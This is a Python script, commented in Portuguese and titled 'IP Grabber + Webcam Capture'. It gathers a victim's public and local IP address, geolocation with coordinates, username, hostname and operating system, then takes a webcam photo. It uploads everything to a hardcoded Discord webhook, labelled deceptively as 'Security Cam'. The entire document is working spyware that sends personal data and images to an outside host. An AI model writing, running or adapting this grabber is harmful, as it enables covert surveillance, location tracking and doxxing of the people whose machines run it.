#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IP Grabber + Webcam Capture
Captura IP e foto da webcam, envia para Discord webhook
"""

import socket
import requests
import json
import platform
import os
import cv2
import base64
import tempfile
from datetime import datetime
from io import BytesIO

# CONFIGURAÇÃO DO WEBHOOK
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1533982576513908776/bQugIL9y6ak9394ljj8fg-6aJ_fumnXPyRjVMldJq53iKoIFjl0yRqJxSI7cylkDya3P"

def get_public_ip():
    """Obtém IP público"""
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json().get('ip', 'N/A')
    except:
        return "N/A"

def get_local_ip():
    """Obtém IP local"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "N/A"

def get_geolocation(ip):
    """Obtém geolocalização"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            return {
                "pais": data.get('country'),
                "cidade": data.get('city'),
                "regiao": data.get('regionName'),
                "isp": data.get('isp'),
                "org": data.get('org'),
                "lat": data.get('lat'),
                "lon": data.get('lon')
            }
    except:
        pass
    return {}

def get_system_info():
    """Informações do sistema"""
    return {
        "hostname": socket.gethostname(),
        "usuario": os.getenv('USER') or os.getenv('USERNAME') or "N/A",
        "sistema": f"{platform.system()} {platform.release()}",
        "maquina": platform.machine(),
        "hora": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    }

def capture_webcam():
    """Tira foto da webcam"""
    try:
        # Tenta abrir a webcam padrão (0)
        cap = cv2.VideoCapture(0)
        
        # Aguarda a câmera inicializar
        for _ in range(10):
            ret, frame = cap.read()
            if ret:
                break
        
        if not ret:
            cap.release()
            return None, "Não foi possível capturar da webcam"
        
        # Captura o frame
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return None, "Falha na captura"
        
        # Converte BGR para RGB
        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        
        # Salva em buffer de memória
        is_success, buffer = cv2.imencode(".jpg", frame)
        if not is_success:
            return None, "Erro ao codificar imagem"
        
        io_buf = BytesIO(buffer)
        return io_buf, None
        
    except Exception as e:
        return None, str(e)

def send_to_discord(ip_data, image_buffer):
    """Envia dados e imagem para o Discord"""
    try:
        sys_info = ip_data['sistema']
        geo = ip_data.get('geolocalizacao', {})
        
        # Monta a mensagem
        content = f"🚨 **Nova Captura** - {sys_info['hora']}"
        
        # Cria o embed
        embed = {
            "title": "📸 Captura de Webcam + IP",
            "color": 0xFF0000,
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {"text": "Webcam Logger"},
            "fields": [
                {
                    "name": "🌐 IP Público",
                    "value": f"`{ip_data['ip_publico']}`",
                    "inline": True
                },
                {
                    "name": "📍 IP Local",
                    "value": f"`{ip_data['ip_local']}`",
                    "inline": True
                },
                {
                    "name": "📍 Localização",
                    "value": f"{geo.get('cidade', 'N/A')}, {geo.get('pais', 'N/A')}",
                    "inline": False
                },
                {
                    "name": "🌐 Provedor",
                    "value": f"{geo.get('isp', 'N/A')}",
                    "inline": True
                },
                {
                    "name": "💻 Sistema",
                    "value": f"{sys_info['sistema']}\n{sys_info['maquina']}",
                    "inline": True
                },
                {
                    "name": "👤 Usuário",
                    "value": f"`{sys_info['usuario']}`\n`{sys_info['hostname']}`",
                    "inline": True
                }
            ]
        }
        
        # Se tiver coordenadas, adiciona link do mapa
        if geo.get('lat') and geo.get('lon'):
            embed["fields"].append({
                "name": "🗺️ Mapa",
                "value": f"[Ver Localização](https://www.google.com/maps?q={geo['lat']},{geo['lon']})",
                "inline": True
            })
        
        # Prepara o payload multipart
        payload = {
            "payload_json": json.dumps({
                "content": content,
                "embeds": [embed],
                "username": "Security Cam",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/3024/3024605.png"
            })
        }
        
        # Prepara o arquivo de imagem
        files = {
            "file": ("webcam_capture.jpg", image_buffer, "image/jpeg")
        }
        
        # Envia para o Discord
        response = requests.post(
            DISCORD_WEBHOOK,
            data=payload,
            files=files,
            timeout=30
        )
        
        return response.status_code == 200 or response.status_code == 204
        
    except Exception as e:
        print(f"[!] Erro ao enviar: {e}")
        return False

def main():
    print("""
    ╔══════════════════════════════════════════╗
    ║      📸 WEBCAM + IP LOGGER v1.0         ║
    ╚══════════════════════════════════════════╝
    """)
    
    # Coleta dados
    print("[*] Obtendo IP público...")
    ip_publico = get_public_ip()
    print(f"[+] IP: {ip_publico}")
    
    print("[*] Consultando geolocalização...")
    geo = get_geolocation(ip_publico) if ip_publico != "N/A" else {}
    
    print("[*] Coletando info do sistema...")
    sys_info = get_system_info()
    
    dados = {
        "ip_publico": ip_publico,
        "ip_local": get_local_ip(),
        "geolocalizacao": geo,
        "sistema": sys_info
    }
    
    # Captura webcam
    print("[*] Inicializando webcam...")
    print("[!] Preparando para tirar foto em 3 segundos...")
    
    import time
    time.sleep(3)
    
    print("[*] Capturando imagem...")
    image_buffer, error = capture_webcam()
    
    if error:
        print(f"[!] Erro na webcam: {error}")
        print("[*] Enviando apenas dados de IP...")
        # Envia sem imagem
        image_buffer = None
    
    # Envia para Discord
    print("[*] Enviando para o Discord...")
    if send_to_discord(dados, image_buffer):
        print("[✓] Enviado com sucesso!")
    else:
        print("[!] Falha no envio")
    
    # Salva localmente também
    if image_buffer:
        try:
            filename = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            with open(filename, 'wb') as f:
                f.write(image_buffer.getvalue())
            print(f"[✓] Imagem salva: {filename}")
        except Exception as e:
            print(f"[!] Erro ao salvar local: {e}")
    
    print("\n[✓] Concluído!")

if __name__ == "__main__":
    main()